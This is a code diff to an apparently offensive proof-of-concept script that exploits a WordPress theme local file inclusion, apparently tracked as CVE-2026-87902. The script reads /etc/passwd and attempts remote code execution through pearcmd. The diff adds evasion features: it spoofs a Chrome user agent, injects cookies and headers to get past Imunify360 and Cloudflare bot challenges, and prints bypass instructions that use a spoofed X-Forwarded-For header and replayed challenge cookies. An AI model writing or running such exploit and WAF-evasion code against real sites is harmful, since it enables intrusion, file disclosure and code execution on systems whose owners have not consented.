@@ -102,6 +102,28 @@ PASSWD_INDICATORS: list[str] = [
     "/sbin/nologin", "/usr/sbin/nologin",
 ]
 
+# Strings that indicate a WAF / bot-challenge interception (not real WP response)
+BOT_CHALLENGE_INDICATORS: list[str] = [
+    "One moment, please",          # Imunify360 JS challenge
+    "window.location.reload()",    # Imunify360 reload trick
+    "Ray ID",                      # Cloudflare challenge
+    "cf-browser-verification",     # Cloudflare
+    "Checking your browser",       # Cloudflare / generic WAF
+    "DDoS protection by",          # Generic WAF
+    "Enable JavaScript and cookies",  # Generic bot challenge
+    "__cf_chl",                    # Cloudflare cookie name
+    "security check",              # Generic
+]
+
+# Specific PEAR output markers (much tighter than bare "config")
+PEAR_SUCCESS_INDICATORS: list[str] = [
+    "Writing PEAR configuration file",
+    "pear_config",                 # XML root element in the config stub
+    "PEAR_Config",
+    "default_channel",             # key that PEAR always writes
+    "preferred_state",             # another PEAR config key
+]
+
 
 # ---------------------------------------------------------------------------
 # Payload helpers
@@ -151,12 +173,31 @@ def strip_php(path: str) -> str:
 # Network helpers
 # ---------------------------------------------------------------------------
 
-def make_session(ua: str = "Mozilla/5.0 (Security Research)") -> requests.Session:
+def make_session(
+    ua: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+              "AppleWebKit/537.36 (KHTML, like Gecko) "
+              "Chrome/126.0.0.0 Safari/537.36",
+    cookies: Optional[str] = None,
+    extra_headers: Optional[list[str]] = None,
+) -> requests.Session:
     s = requests.Session()
     s.headers["User-Agent"] = ua
     # Defeat caching layers (LiteSpeed, Varnish, Nginx proxy cache, etc.)
     s.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
     s.headers["Pragma"] = "no-cache"
+    # Extra headers (e.g. to pass WAF bypass tokens)
+    if extra_headers:
+        for h in extra_headers:
+            if ":" in h:
+                k, v = h.split(":", 1)
+                s.headers[k.strip()] = v.strip()
+    # Cookie string (e.g. from a real browser that solved a JS challenge)
+    if cookies:
+        for pair in cookies.split(";"):
+            pair = pair.strip()
+            if "=" in pair:
+                k, v = pair.split("=", 1)
+                s.cookies.set(k.strip(), v.strip())
     return s
 
 
@@ -204,6 +245,11 @@ def request_lfi(
     except requests.RequestException as exc:
         print(f"[-] Request failed: {exc}")
         return None
+
+
+def detect_bot_challenge(body: str) -> bool:
+    """Return True when the response is a WAF/bot-challenge page, not WordPress."""
+    return any(ind in body for ind in BOT_CHALLENGE_INDICATORS)
 
 
 def confirm_lfi(body: str) -> bool:
@@ -268,10 +314,11 @@ def attempt_pearcmd_rce(
             )
         try:
             r = session.get(raw_url, timeout=15)
-            if r.status_code == 200 and (
-                "PEAR" in r.text
-                or "config" in r.text.lower()
-                or "pear_config" in r.text.lower()
+            if detect_bot_challenge(r.text):
+                print(f"    [!] WAF/bot-challenge intercepted — see bypass note below")
+                return None
+            if r.status_code == 200 and any(
+                ind in r.text for ind in PEAR_SUCCESS_INDICATORS
             ):
                 return pearcmd + ".php"
         except requests.RequestException:
@@ -344,6 +391,16 @@ examples:
         help="Destination path for the pearcmd config stub "
              "(default: /tmp/cve_2026_87902.php).",
     )
+    p.add_argument(
+        "--cookie", metavar="STR",
+        help="Cookie header value to send (e.g. 'imunify_js_cookie=abc; wp_session=xyz'). "
+             "Obtain from a real browser that has solved a WAF JS challenge.",
+    )
+    p.add_argument(
+        "-H", "--header", metavar="NAME:VALUE", action="append", dest="headers",
+        help="Extra request header (repeatable). "
+             "Example: -H 'X-Forwarded-For: 127.0.0.1' -H 'Host: target.local'",
+    )
     p.add_argument("-v", "--verbose", action="store_true", help="Print raw response body.")
     return p
 
@@ -352,7 +409,7 @@ def main() -> None:
     print(BANNER)
     args = build_arg_parser().parse_args()
     base_url = args.url.rstrip("/")
-    session = make_session()
+    session = make_session(cookies=args.cookie, extra_headers=args.headers)
 
     # ── Step 1: resolve theme directory ────────────────────────────────────
     suffix = args.theme_dir
@@ -391,9 +448,26 @@ def main() -> None:
         print(resp.text[:1000])
         print("───────────────────────────────────────\n")
 
-    if resp.status_code == 200 and confirm_lfi(resp.text):
+    if detect_bot_challenge(resp.text):
+        print("\n[!]  WAF / Bot-challenge detected — not a WordPress response.")
+        print("     The WAF (likely Imunify360) is intercepting requests before they")
+        print("     reach PHP. Bypass options:")
+        print()
+        print("     1. Solve the JS challenge in a real browser, then copy the cookie:")
+        print(f"        python3 poc.py {base_url} --page-id {args.page_id or 'N'} \\")
+        print( "                --cookie 'imunify_js_cookie=<value>; wordpress_logged_in=<value>'")
+        print()
+        print("     2. Run the request from the target server itself (bypasses external WAF):")
+        print(f"        curl -sk 'http://127.0.0.1/?page_id={args.page_id or 73}&pagename={payload}' \\")
+        print( "             -H 'Host: <target-domain>'")
+        print()
+        print("     3. Use direct IP with a spoofed X-Forwarded-For header:")
+        print( "        python3 poc.py <ip> --page-id N -H 'X-Forwarded-For: 127.0.0.1' \\")
+        print( "                -H 'Host: <target-domain>'")
+        if not args.rce:
+            return
+    elif resp.status_code == 200 and confirm_lfi(resp.text):
         print("\n[!!!] LFI CONFIRMED — /etc/passwd content detected in response")
-        # Print the passwd lines that leaked
         for line in resp.text.splitlines():
             if ":" in line and not line.startswith("<") and len(line) < 150:
                 print(f"      {line}")
